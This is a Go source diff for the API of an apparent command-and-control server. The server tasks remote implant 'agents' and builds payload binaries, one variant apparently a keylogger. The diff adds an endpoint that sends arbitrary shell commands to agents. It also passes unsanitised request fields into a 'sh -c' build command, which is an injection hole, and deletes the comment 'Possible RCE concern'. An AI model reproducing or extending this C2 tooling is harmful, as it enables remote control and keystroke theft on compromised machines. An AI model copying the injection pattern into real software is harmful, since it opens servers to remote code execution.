@@ -1,6 +1,7 @@
 package api
 
 import (
+	"os"
 	"os/exec"
 	"fmt"
 	"net/http"
@@ -54,7 +55,7 @@ func GetOneAgentByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
-    agents, err := data.FetchOne(uuid)
+    agents, err := data.FetchOneAgent(uuid)
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
         return
@@ -64,11 +65,11 @@ func GetOneAgentByUUID(c *gin.Context) {
     return
 }
 
-func GetAgentByUUID(c *gin.Context) {
+func GetAgentCommandsByUUID(c *gin.Context) {
     // Get agents by UUID
 	uuid := c.Param("agt")
 	fmt.Println("Trying to find agent", uuid)
-    agents, err := data.Agent(uuid)
+    agents, err := data.GetAgentCommands(uuid)
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
         return
@@ -106,6 +107,21 @@ func UpdateAgentHandler(c *gin.Context) {
 		data.SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID)
 		c.JSON(http.StatusOK, gin.H{"message": "Success"})
 	}
+}
+
+func SendCommandHandler(c *gin.Context) {
+	agentParam := c.Param("agt")
+	newCmdID := uuid.New().String()
+
+	var body map[string]string
+	if err := c.BindJSON(&body); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
+		return
+	}
+
+	command := body["command"]
+	data.SendAgentCommand(agentParam, "0", "shell", command, newCmdID)
+	c.JSON(http.StatusOK, gin.H{"message": "Success"})
 }
 
 func KillAgentHandler(c *gin.Context) {
@@ -166,7 +182,9 @@ func DeleteAgentHandler(c *gin.Context) {
 }
 
 func CreatePayloadHandler(c *gin.Context) {
-	publickey := data.GoDotEnvVariable("PUBLIC_KEY")
+	publickey := os.Getenv("PUBLIC_KEY")
+	repo_dir := os.Getenv("REPO_DIR")
+
 	newPayID := uuid.New().String()
 	var body map[string]string
 	if err := c.BindJSON(&body); err != nil {
@@ -199,11 +217,12 @@ func CreatePayloadHandler(c *gin.Context) {
 		tag := strings.Split(newPayID, "-")
 		concat := body["name"] + "_" + tag[0]
 		var commandString string
-		// Possible RCE concern
-		if body["type"] == "original" {
-			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
 
-				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/client.go",
+		if body["type"] == "original" {
+			commandString = fmt.Sprintf(
+				"docker run --rm -v %s:/build -w /build golang:1.22.3 "+
+				"go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o /build/payloads/%s /build/client/client.go",
+				repo_dir,
 				body["serverip"],
 				body["serverport"],
 				body["callbackfrequency"],
@@ -212,9 +231,10 @@ func CreatePayloadHandler(c *gin.Context) {
 				concat,
 			)
 		} else if body["type"] == "wkeys" {
-			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
-
-				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/kclient/kclient.go",
+			commandString = fmt.Sprintf(
+				"docker run --rm -v %s:/build -w /build golang:1.22.3 "+
+				"go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o /build/payloads/%s /build/client/kclient/kclient.go",
+				repo_dir,
 				body["serverip"],
 				body["serverport"],
 				body["callbackfrequency"],
@@ -223,13 +243,43 @@ func CreatePayloadHandler(c *gin.Context) {
 				concat,
 			)
 		}
-		fmt.Println("body")
-		err := exec.Command("sh", "-c", commandString).Run()
+		fmt.Printf("Body")
+		fmt.Printf("Running command: %s", commandString)
+		cmd := exec.Command("sh", "-c", commandString)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		err := cmd.Run()
 		if err != nil {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error"})
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
 		} else {
 			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
 			c.JSON(http.StatusOK, gin.H{"data": "success"})
 		}
+	}
+}
+
+func GetNoteHandler (c *gin.Context) {
+	agentParam := c.Param("agt")
+	notes, err := data.GetAgentNotes(agentParam)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
+	} else {
+		c.JSON(http.StatusOK, gin.H{"data": notes})
+	}
+}
+
+func PutNoteHandler (c *gin.Context) {
+	agentParam := c.Param("agt")
+	var body map[string]string
+	if err := c.BindJSON(&body); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
+		return
+	}
+	notes := body["notes"]
+	err := data.PutAgentNotes(agentParam, notes)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
+	} else {
+		c.JSON(http.StatusOK, gin.H{"message": "Success"})
 	}
 }
